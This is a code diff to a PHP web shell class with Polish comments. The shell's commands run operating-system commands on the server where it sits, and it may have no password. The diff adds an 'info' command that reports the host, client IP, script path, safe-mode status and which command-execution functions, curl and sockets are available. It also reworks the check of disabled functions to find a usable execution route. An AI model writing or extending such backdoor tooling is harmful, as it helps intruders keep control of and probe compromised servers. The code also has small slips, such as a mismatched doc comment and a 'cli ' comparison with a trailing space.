@@ -35,7 +35,7 @@ class Shell
 help - Wyświetlanie pomocy
 modules - Informacje o modułach
 system, exec - Uruchomienie polecenia systemowego
-';
+info - Wyświetla informacje o systemie';
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -70,6 +70,14 @@ system, exec - Uruchomienie polecenia systemowego
 	 * @var    array
 	 */
 	private $aDisableFunctions = array();
+
+	/**
+	 * Mozliwe jest wykonanie polecenia systemowego ?
+	 *
+	 * @access private
+	 * @var    boolean
+	 */
+	private $bExec = FALSE;
 
 	/**
 	 * Dzialamy w srodowisku Windows ?
@@ -180,6 +188,18 @@ system, exec - Uruchomienie polecenia systemowego
 		Request::init();
 
 		/**
+		 * disable_functions
+		 */
+		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
+		{
+			$aDisableFunctions = explode( ',', $sDisableFunctions );
+
+			array_walk( $aDisableFunctions, create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ) );
+
+			$this -> aDisableFunctions = $aDisableFunctions;
+		}
+
+		/**
 		 * Czy dzialamy na Windowsie ?
 		 */
 		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );
@@ -188,6 +208,11 @@ system, exec - Uruchomienie polecenia systemowego
 		 * SafeMode
 		 */
 		$this -> bSafeMode = (boolean) ini_get( 'safe_mode' );
+
+		/**
+		 * Mozliwosc wywolania polecenia systemowego
+		 */
+		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( array( 'exec', 'shell_exec', 'passthru', 'system', 'popen' ), $this -> aDisableFunctions ) ) > 0 ) );
 
 		/**
 		 * Jesli SafeMode jest wylaczony
@@ -208,18 +233,6 @@ system, exec - Uruchomienie polecenia systemowego
 		error_reporting( -1 );
 		ignore_user_abort( 0 );
 		date_default_timezone_set( 'Europe/Warsaw' );
-
-		/**
-		 * disable_functions
-		 */
-		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
-		{
-			$aDisableFunctions = explode( ',', $sDisableFunctions );
-
-			array_walk( $aDisableFunctions, create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ) );
-
-			$this -> aDisableFunctions = $aDisableFunctions;
-		}
 
 		/**
 		 * Wczytywanie modulow
@@ -584,6 +597,45 @@ DATA;
 	}
 
 	/**
+	 * Wykonanie polecenia systemowago
+	 *
+	 * @access public
+	 * @param  string $sCmd Komenda
+	 * @return string
+	 */
+
+	private function getCommandInfo()
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> iArgc !== 0 )
+		{
+			return <<<DATA
+info - Wyświetla informacje o systemie
+
+	Użycie:
+		info
+DATA;
+		}
+
+		return sprintf( "- SERVER:[%s], IP:[%s], Host:[%s]\r\n.    PHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\n.    SAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%s]",
+			php_uname(),
+			( $sIp = Request::getServer( 'REMOTE_ADDR' ) ),
+			gethostbyaddr( $sIp ),
+			PHP_VERSION,
+			php_sapi_name(),
+			( ( PHP_SAPI === 'cli ') ? 'CLI' : Request::getCurrentUrl() ),
+			Request::getServer( 'SCRIPT_FILENAME' ),
+			(int) $this -> bSafeMode,
+			(int) $this -> bExec,
+			function_exists( 'curl_init' ),
+			function_exists( 'socket_create' )
+
+		);
+	}
+
+	/**
 	 * Domyslna akcja, dostep do konsoli
 	 *
 	 * @uses   Request
@@ -687,6 +739,9 @@ DATA;
 				case 'exec':
 					$sConsole = $this -> getCommandSystem( $this -> sArgv );
 					break ;
+				case 'info':
+					$sConsole = $this -> getCommandInfo();
+					break ;
 				default :
 					if( $this -> aModules === array() )
 					{
@@ -721,7 +776,7 @@ DATA;
 		 */
 		else
 		{
-			$sConsole = $this -> getCommandSystem( $this -> sArgv );
+			$sConsole = $this -> getCommandSystem( $sCmd );
 		}
 
 		if( $bRaw || ( PHP_SAPI === 'cli' ) )
